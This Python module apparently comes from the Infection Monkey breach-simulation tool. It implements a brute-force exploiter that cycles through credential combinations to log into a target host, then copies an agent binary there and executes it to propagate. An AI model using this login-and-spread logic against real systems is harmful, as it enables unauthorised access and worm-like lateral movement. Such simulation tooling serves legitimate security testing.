import logging
from io import BytesIO
from typing import Callable

from common.types import Event
from infection_monkey.exploit import IAgentBinaryRepository
from infection_monkey.i_puppet import ExploiterResultData, TargetHost
from infection_monkey.propagation_credentials_repository import IPropagationCredentialsRepository
from infection_monkey.utils.threading import interruptible_iter

from . import (
    IRemoteAccessClient,
    IRemoteAccessClientFactory,
    RemoteAuthenticationError,
    RemoteFileCopyError,
    generate_brute_force_credentials,
)
from .helpers import get_agent_dst_path

logger = logging.getLogger(__name__)


class BruteForceExploiter:
    def __init__(
        self,
        build_command: Callable[[str, str], str],
        exploit_client_factory: IRemoteAccessClientFactory,
        propagation_credentials_repository: IPropagationCredentialsRepository,
        agent_binary_repository: IAgentBinaryRepository,
    ):
        self._build_command = build_command
        self._exploit_client_factory = exploit_client_factory
        self._propagation_credentials_repository = propagation_credentials_repository
        self._agent_binary_repository = agent_binary_repository

    def exploit_host(
        self,
        host: TargetHost,
        interrupt: Event,
    ) -> ExploiterResultData:
        if interrupt.is_set():
            return ExploiterResultData()

        exploit_client = self._exploit_client_factory.create()

        try:
            self._exploit(exploit_client, interrupt)
        except Exception as err:
            logger.exception(f"Failed to exploit {host}: {err}")
            return ExploiterResultData()

        try:
            self._propagate(exploit_client, host, interrupt)
            return ExploiterResultData(exploitation_success=True, propagation_success=True)
        except Exception as err:
            logger.exception(f"Failed to propagate to {host}: {err}")
            return ExploiterResultData(exploitation_success=True)

    def _exploit(self, exploit_client: IRemoteAccessClient, interrupt: Event):
        credentials = self._propagation_credentials_repository.get_credentials()
        credential_combinations = generate_brute_force_credentials(credentials)

        for brute_force_credentials in interruptible_iter(credential_combinations, interrupt):
            try:
                exploit_client.login(brute_force_credentials)
                return
            except RemoteAuthenticationError:
                continue

        raise Exception("Failed to login with the given credentials")

    def _propagate(
        self,
        exploit_client: IRemoteAccessClient,
        host: TargetHost,
        interrupt: Event,
    ):
        agent_binary = self._agent_binary_repository.get_agent_binary(host.operating_system)
        destination = get_agent_dst_path(host)
        file_path = self._copy_file(agent_binary, destination, exploit_client, interrupt)

        command = self._build_command(file_path, destination)
        exploit_client.execute(command)

    def _copy_file(
        self, file: BytesIO, destination: str, exploit_client: IRemoteAccessClient, interrupt: Event
    ) -> str:
        file_data = file.getvalue()
        try:
            exploit_client.copy_file(file_data, destination)
            return destination
        except RemoteFileCopyError:
            other_destinations = exploit_client.get_available_paths()
            for other_destination in interruptible_iter(other_destinations, interrupt):
                try:
                    exploit_client.copy_file(file_data, other_destination)
                    return other_destination
                except RemoteFileCopyError:
                    continue

        raise Exception("Failed to copy file")
